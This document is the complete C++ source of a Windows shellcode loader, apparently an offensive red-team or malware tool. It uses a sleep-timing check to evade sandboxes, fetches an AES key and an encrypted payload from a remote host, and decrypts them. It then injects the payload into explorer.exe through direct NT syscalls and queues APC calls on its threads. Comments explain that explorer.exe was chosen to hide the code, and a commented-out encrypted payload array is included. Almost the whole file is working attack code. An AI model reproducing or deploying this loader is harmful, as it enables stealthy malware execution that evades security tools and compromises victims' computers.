#include <Ws2tcpip.h>
#include <Windows.h>
#include <winhttp.h>
#include <TlHelp32.h>
#include "syscalls_all.h"
#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <iomanip>
#include <ctype.h>
#include <algorithm>

#pragma comment(lib, "winhttp")
#pragma comment( lib, "Ws2_32.lib" )

struct DATA {
	LPVOID data;
	size_t len;
};

void checkSandbox() {
	auto start = std::chrono::system_clock::now();
	std::this_thread::sleep_for(std::chrono::seconds(5));
	auto end = std::chrono::system_clock::now();
	std::chrono::duration<double> actualElapsedSec = end - start;
	if (actualElapsedSec.count() <= 4.5)
		exit(0);
}

DATA download(char* host, int port, char* resource) {
	DATA out;
	WSADATA wsaData;
	SOCKET sockfd;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		std::cerr << "[-] Error initializing winsock: " << iResult << std::endl;
		goto Cleanup;
	}

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == INVALID_SOCKET) {
		std::cerr << "[-] Error creating socket: " << std::endl;
		goto Cleanup;
	}
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);

	if (inet_pton(AF_INET, host, &serv_addr.sin_addr) != 1) {
		std::cerr << "[-] Error converting IP address" << std::endl;
		goto Cleanup;
	}
	if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		std::cerr << "[-] Error connecting to server" << std::endl;
		goto Cleanup;
	}
	{
		std::string request = "GET /";
		request.append(resource);
		request.append(" HTTP/1.1\r\n\r\n");
		int num_bytes = send(sockfd, request.c_str(), request.size(), 0);
		std::vector<unsigned char> data;
		char buffer[512];
		while ((num_bytes = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
			data.insert(data.end(), buffer, buffer + num_bytes);
		}
		std::cout << "[*] Received " << data.size() << " bytes" << std::endl;

		std::vector<unsigned char> justData;
		std::vector<unsigned char>::iterator it = std::search(data.begin(), data.end(), "\r\n\r\n", "\r\n\r\n" + 4);
		if (it != data.end()) {
			std::vector<unsigned char> data_only(it + 4, data.end());
			justData = data_only;
		}
		else {
			std::cerr << "[-] Error parsing HTTP response" << std::endl;
		}
		size_t size = justData.size();
		char* bufdata = (char*)malloc(size);
		for (int i = 0; i < size; i++) {
			bufdata[i] = justData[i];
		}
		out.data = bufdata;
		out.len = size;
		goto Cleanup;
	}
Cleanup:
	if (sockfd)
		closesocket(sockfd);
	WSACleanup();
	return out;
}

BOOL decryptAES(char* shellcode, DWORD dwShellcodeLen, char* key, DWORD keyLen) {
	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTHASH hHash = NULL;

	const char* stage = "init";
	BOOL success = TRUE;

	if (success) {
		stage = "CryptAcquireContextW";
		success = CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	}

	if (success) {
		stage = "CryptCreateHash";
		success = CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash);
	}

	if (success) {
		stage = "CryptHashData";
		success = CryptHashData(hHash, (BYTE*)key, keyLen, 0);
	}

	if (success) {
		stage = "CryptDeriveKey";
		success = CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey);
	}

	if (success) {
		stage = "CryptDecrypt";
		success = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &dwShellcodeLen);
	}

	if (!success) {
		std::cerr << "[-] Error in stage " << stage << " with error " << std::hex << GetLastError();
		return FALSE;
	}
	// Cleanup
	CryptReleaseContext(hCryptProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return TRUE;
}

int main(int argc, char** argv) {

	if (argc != 5) {
		std::cout << "[*] Usage: " << argv[0] << " <host> <port> <binary.enc> <aes.key>" << std::endl;
		return 1;
	}

	char* host = argv[1];
	DWORD port = atoi(argv[2]);
	char* binFile = argv[3];
	char* keyFile = argv[4];

	// Sleep for several seconds, then check if sandbox fast-fowarded sleep
	// If so, exit. If not, continue
	checkSandbox();

	// Decrypt shellcode

	DATA key = download(host, port, keyFile);
	char* aesKey = (char*)key.data;
	DATA bin = download(host, port, binFile);
	char* payload = (char*)bin.data;

	//char aesKey[] = { 0x95, 0xb8, 0x08, 0xb8, 0x8b, 0xc8, 0x05, 0x3d, 0x24, 0x65, 0x80, 0xa1, 0xce, 0xda, 0xcb, 0xe9 };
	//char payload[] = { 0x8c, 0x85, 0x6a, 0xde, 0x89, 0x5f, 0x10, 0xfe, 0x53, 0x62, 0x71, 0x44, 0x4b, 0xe3, 0xd6, 0x99, 0x6f, 0xdc, 0x87, 0x69, 0x6c, 0x4a, 0x6d, 0xb5, 0xe0, 0x03, 0x45, 0x32, 0x08, 0xbc, 0xd7, 0xe2, 0xa3, 0xc5, 0xaf, 0x81, 0x79, 0xd0, 0x32, 0xaa, 0xfd, 0xf6, 0x0d, 0xeb, 0x48, 0xd9, 0x95, 0x92, 0x01, 0xef, 0x0b, 0x44, 0x4b, 0xa6, 0x4e, 0x21, 0xab, 0xab, 0xda, 0x3e, 0x1b, 0x3f, 0xd6, 0xa9, 0x51, 0x7f, 0x5b, 0x55, 0x5d, 0x06, 0xd5, 0xbc, 0xbd, 0x96, 0xe9, 0x9c, 0xdd, 0xe4, 0x50, 0xe2, 0x1a, 0x6f, 0x1f, 0x58, 0xb6, 0x5d, 0x9c, 0x35, 0x37, 0x31, 0xc7, 0xab, 0x60, 0x0c, 0x1b, 0xfe, 0xe2, 0x87, 0x72, 0xfd, 0xe0, 0xc5, 0xe2, 0x66, 0x98, 0x5c, 0xf6, 0x4e, 0x28, 0xf5, 0x03, 0xb0, 0x24, 0xfe, 0x1d, 0xad, 0x59, 0x5a, 0x01, 0x71, 0x6f, 0xf0, 0x8e, 0xff, 0xc8, 0xdb, 0x87, 0xa4, 0x95, 0xfb, 0x7e, 0x2f, 0xaa, 0x0e, 0xa5, 0x83, 0x9d, 0x9e, 0xcc, 0x6c, 0x73, 0xd3, 0x0d, 0x15, 0x99, 0xd3, 0xd9, 0x1b, 0xbb, 0xf4, 0x23, 0x81, 0x76, 0xe8, 0x58, 0xd5, 0xda, 0x21, 0x77, 0x93, 0x5c, 0xab, 0x8f, 0x32, 0xf5, 0x69, 0x2e, 0xe7, 0xd0, 0xdf, 0x72, 0x8b, 0x9f, 0x5d, 0x9c, 0xc4, 0x2f, 0x13, 0x05, 0xa2, 0x20, 0x6a, 0xd7, 0x84, 0x2d, 0xe9, 0x6f, 0x5f, 0xc2, 0x75, 0xdc, 0x4e, 0x7c, 0xf3, 0x19, 0x52, 0x12, 0x4b, 0x40, 0x90, 0x03, 0x60, 0xf9, 0x05, 0xc8, 0x17, 0xa5, 0xfe, 0xd2, 0x82, 0x86, 0xa1, 0x83, 0xfc, 0x62, 0x38, 0x3d, 0x49, 0x04, 0x61, 0x07, 0x14, 0x7a, 0xeb, 0x38, 0xbf, 0x70, 0x80, 0xf3, 0x38, 0xaa, 0x6e, 0xfd, 0xae, 0x22, 0x90, 0x8f, 0x78, 0x3c, 0x82, 0x43, 0xf1, 0xac, 0x83, 0x99, 0x9a, 0xa0, 0xfa, 0x30, 0x9f, 0x25, 0xe3, 0x39, 0x7e, 0xd8, 0x83, 0xc1, 0xca, 0x5c, 0x98, 0x11, 0xa5, 0xbd, 0x19, 0x47, 0xc2, 0xf4, 0x98, 0xe2, 0xf3, 0xbf, 0x8b, 0xc3, 0xb7, 0xd6, 0x01, 0x34, 0xb7, 0xe6, 0xb8, 0x50, 0x5f, 0x87, 0x35, 0xd4, 0xe6, 0xa8, 0x35, 0xa6, 0x88, 0x90, 0x84, 0x06, 0x3a, 0xd6, 0x3f, 0x87, 0xb3, 0xa4, 0x53, 0x6a, 0x25, 0xab, 0x8e, 0xe3, 0x57, 0xed, 0x37, 0xb8, 0xc6, 0x92, 0xe0, 0xbf, 0xcc, 0xbe, 0x1f, 0xb5, 0x70, 0xa9, 0x92, 0xac, 0xbc, 0x8e, 0x5f, 0x1c, 0x17, 0xfe, 0x2f, 0x75, 0x9e, 0xbf, 0x2a, 0x93, 0xfc, 0x62, 0x4a, 0x32, 0xbc, 0x3f, 0x7b, 0xaa, 0xfb, 0xf0, 0x24, 0xfa, 0x68, 0x08, 0x1c, 0xee, 0xb5, 0x31, 0x05, 0x61, 0xfd, 0xa8, 0xa6, 0xde, 0x44, 0x91, 0xfe, 0x24, 0x78, 0xf6, 0xc3, 0x28, 0xde, 0xac, 0x75, 0x97, 0xe2, 0xd1, 0x28, 0x6a, 0xdf, 0x91, 0x4a, 0x2e, 0x5c, 0x4a, 0x12, 0x76, 0x4d, 0x77, 0xc3, 0x65, 0xa3, 0x30, 0x67, 0x12, 0x19, 0xd0, 0x41, 0xfb, 0xaf, 0xd7, 0x2f, 0x68, 0xc6, 0xe7, 0x1b, 0xb3, 0x88, 0x31, 0x07, 0xed, 0xd5, 0xed, 0x0b, 0x49, 0x39, 0x6f, 0xc6, 0x08, 0x44, 0xec, 0xc2, 0x9c, 0x49, 0xe1, 0xeb, 0xb1, 0x26, 0x34, 0xe2, 0xff, 0x04, 0x12, 0x3e, 0x2b, 0xa5, 0x12, 0x48, 0x75, 0xe6, 0x08, 0x42, 0x28, 0x68, 0xc5, 0x94, 0x33, 0x2b, 0x97, 0xd6, 0x40, 0x99, 0xb5, 0xb8, 0x1e, 0x6e, 0xbb, 0x78, 0x1a, 0xd9, 0x03, 0x5d, 0xc3, 0xa5, 0xad, 0x94, 0xa8, 0xe0, 0xb6, 0xc8 };

	decryptAES(payload, bin.len, aesKey, key.len);

	// Pointer to beginning of memory that will be used for shellcode
	LPVOID startAllocation;
	// Shellcode size for memory allocation
	SIZE_T allocationSize = bin.len;
	std::cout << "allocationSize: " << allocationSize << std::endl;
	// Handles to thread and process we will inject into
	HANDLE hThread;
	HANDLE hProcess;

	// Take a snapshot of currently running processes. We need this to find the PID of explorer.exe
	// Explorer.exe gets chosen because it's possible hide large amounts of shellcode in it, as well
	// as its frequency of use.
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	PROCESSENTRY32 processEntry {sizeof(PROCESSENTRY32)};
	// Variable to store explorer.exe's PID
	DWORD dwPID;

	// Locate explorer.exe
	if (Process32First(hProcessSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(hProcessSnapshot, &processEntry);
		}
	}
	// Store its PID
	dwPID = processEntry.th32ProcessID;

	// Get the values we need for NT syscalls
	OBJECT_ATTRIBUTES ProcessAttributes;
	InitializeObjectAttributes(&ProcessAttributes, NULL, NULL, NULL, NULL);

	CLIENT_ID ProcessClientID;
	ProcessClientID.UniqueProcess = (PVOID)processEntry.th32ProcessID;
	ProcessClientID.UniqueThread = (PVOID)0;

	// These syscalls will be made using SysWhispers3
	startAllocation = nullptr;
	NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &ProcessAttributes, &ProcessClientID);
	NtAllocateVirtualMemory(hProcess, &startAllocation, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(hProcess, startAllocation, payload, bin.len, 0);

	// Place every thread of explorer.exe in threadIDs. We will use this to assign each an 
	// Asynchonous Procedural Call (APC), insert the shellcode, then resume the thread, executing our shellcode.
	// Not all instances of explorer.exe are necessary though, so we'll set a limit
	THREADENTRY32 threadEntry {sizeof(THREADENTRY32)};
	std::vector<DWORD> threadIDs;
	if (Thread32First(hProcessSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIDs.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hProcessSnapshot, &threadEntry));
	}

	// For each threadID, inject our shellcode using the QueueAPC method. Once the number of threads injected
	// hits 3, stop.
	int numThreads = 0;
	for (DWORD ID : threadIDs) {

		OBJECT_ATTRIBUTES tObjectAttributes;
		InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

		CLIENT_ID tClientId;
		tClientId.UniqueProcess = (PVOID)dwPID;
		tClientId.UniqueThread = (PVOID)ID;

		NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
		NtSuspendThread(hThread, NULL);
		NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)startAllocation, startAllocation, NULL, NULL);
		NtResumeThread(hThread, NULL);
		numThreads++;

		if (numThreads == 3) {
			break;
		}
	}

	return 0;
}